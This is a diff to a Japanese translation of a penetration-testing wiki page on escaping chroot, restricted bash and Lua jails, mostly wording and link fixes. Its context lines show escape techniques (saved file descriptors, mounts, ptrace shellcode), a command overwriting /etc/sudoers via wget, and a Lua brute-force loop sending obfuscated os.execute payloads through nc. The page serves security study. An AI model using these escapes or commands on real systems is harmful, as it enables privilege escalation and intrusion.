@@ -8,16 +8,16 @@
 
 ## Chroot エスケープ
 
-[ウィキペディア](https://en.wikipedia.org/wiki/Chroot#Limitations)より: chroot メカニズムは **特権のある** (**root**) **ユーザーによる意図的な改ざんに対して防御することを目的としていません**。ほとんどのシステムでは、chroot コンテキストは正しくスタックされず、十分な特権を持つ chroot プログラムは **二度目の chroot を実行して脱出することができます**。\
+[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) より: chroot メカニズムは **特権のある** (**root**) **ユーザーによる意図的な改ざんに対して防御することを目的としていません**。ほとんどのシステムでは、chroot コンテキストは正しくスタックされず、十分な特権を持つ chroot プログラムは **二度目の chroot を実行して脱出することができます**。\
 通常、脱出するには chroot 内で root である必要があります。
 
 > [!TIP]
-> **ツール** [**chw00t**](https://github.com/earthquake/chw00t) は、次のシナリオを悪用して `chroot` から脱出するために作成されました。
+> **ツール** [**chw00t**](https://github.com/earthquake/chw00t) は、以下のシナリオを悪用して `chroot` から脱出するために作成されました。
 
 ### Root + CWD
 
 > [!WARNING]
-> chroot 内で **root** である場合、**別の chroot** を作成することで **脱出** できます。これは、2 つの chroot が共存できないため (Linux では)、フォルダーを作成し、その新しいフォルダー上に **新しい chroot を作成** すると、**その外にいるあなた** は **新しい chroot の外にいることになり**、したがってファイルシステム内にいることになります。
+> chroot 内で **root** である場合、**別の chroot** を作成することで **脱出** できます。これは、2 つの chroot が共存できないため (Linux では)、フォルダーを作成し、その新しいフォルダーで **新しい chroot を作成**すると、**その外にいるあなた**は **新しい chroot の外にいることになります**。したがって、ファイルシステム内にいることになります。
 >
 > これは通常、chroot が作業ディレクトリを指定された場所に移動しないために発生します。したがって、chroot を作成できますが、その外にいることになります。
 
@@ -79,7 +79,7 @@ system("/bin/bash");
 ### Root + Saved fd
 
 > [!WARNING]
-> これは前のケースに似ていますが、この場合、**攻撃者は現在のディレクトリへのファイルディスクリプタを保存し**、その後**新しいフォルダにchrootを作成します**。最後に、**chrootの外部でそのFDにアクセスできるため**、それにアクセスし、**脱出**します。
+> これは前のケースに似ていますが、この場合、**攻撃者は現在のディレクトリへのファイルディスクリプタを保存し**、その後**新しいフォルダにchrootを作成します**。最後に、彼は**chrootの外でそのFDにアクセスできるため**、それにアクセスし、**脱出**します。
 
 <details>
 
@@ -116,7 +116,7 @@ chroot(".");
 > - 子プロセスで異なるフォルダ内でchrootを実行する
 > - 親プロセスで、新しい子プロセスのchrootの外にあるフォルダのFDを作成する
 > - UDSを使用してそのFDを子プロセスに渡す
-> - 子プロセスはそのFDにchdirし、chrootの外にいるため、脱出することができる
+> - 子プロセスはそのFDにchdirし、chrootの外にいるため、監獄から脱出する
 
 ### Root + Mount
 
@@ -139,7 +139,7 @@ chroot(".");
 
 > [!WARNING]
 >
-> - フォーク（子プロセス）を作成し、FSのより深い異なるフォルダにchrootし、その上でCDする
+> - フォーク（子プロセス）を作成し、FSのより深いフォルダにchrootし、その上でCDする
 > - 親プロセスから、子プロセスがいるフォルダを子のchrootの前のフォルダに移動する
 > - この子プロセスはchrootの外にいることになる
 
@@ -147,7 +147,7 @@ chroot(".");
 
 > [!WARNING]
 >
-> - 以前はユーザーが自分のプロセスを自分のプロセスからデバッグできましたが... これはもはやデフォルトでは不可能です
+> - 以前はユーザーが自分のプロセスを自分のプロセスからデバッグできましたが、これはもはやデフォルトでは不可能です
 > - それでも、可能であれば、プロセスにptraceし、その中でシェルコードを実行することができます（[この例を参照](linux-capabilities.md#cap_sys_ptrace)）。
 
 ## Bash Jails
@@ -177,14 +177,14 @@ echo /home/* #List directory
 ```
 ### スクリプトを作成
 
-_/bin/bash_ を内容とする実行可能ファイルを作成できるか確認してください。
+_check if you can create an executable file with _/bin/bash_ as content_
 ```bash
 red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
 ### SSHからbashを取得する
 
-ssh経由でアクセスしている場合、このトリックを使用してbashシェルを実行できます：
+ssh経由でアクセスしている場合、このトリックを使用してbashシェルを実行できます:
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
@@ -205,9 +205,10 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ### その他のトリック
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
-[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
-[https://gtfobins.github.io](https://gtfobins.github.io/**](https/gtfobins.github.io)\
+[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
+[https://gtfobins.github.io](https://gtfobins.github.io)\
 **ページも興味深いかもしれません:**
+
 
 {{#ref}}
 ../bypass-bash-restrictions/
@@ -216,6 +217,7 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ## Python ジェイル
 
 次のページで Python ジェイルからの脱出に関するトリックがあります:
+
 
 {{#ref}}
 ../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
@@ -238,7 +240,7 @@ print(rawget(string, "char")(0x41, 0x42))
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
-注意してください。前のワンライナーを**異なるlua環境で実行するたびに関数の順序が変わります**。したがって、特定の関数を実行する必要がある場合は、異なるlua環境をロードしてleライブラリの最初の関数を呼び出すことでブルートフォース攻撃を行うことができます。
+注意してください、前のワンライナーを**異なるlua環境で実行するたびに関数の順序が変わります**。したがって、特定の関数を実行する必要がある場合は、異なるlua環境をロードしてle libraryの最初の関数を呼び出すブルートフォース攻撃を実行できます。
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
 #for every interaction with the following line and when you are lucky
@@ -249,7 +251,7 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 #and "char" from string library, and the use both to execute a command
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
-**インタラクティブなluaシェルを取得する**: 制限されたluaシェル内にいる場合は、次のように呼び出すことで新しいluaシェル（できれば無制限）を取得できます:
+**インタラクティブなluaシェルを取得**: 制限されたluaシェル内にいる場合は、次のように呼び出すことで新しいluaシェル（できれば無制限）を取得できます:
 ```bash
 debug.debug()
 ```
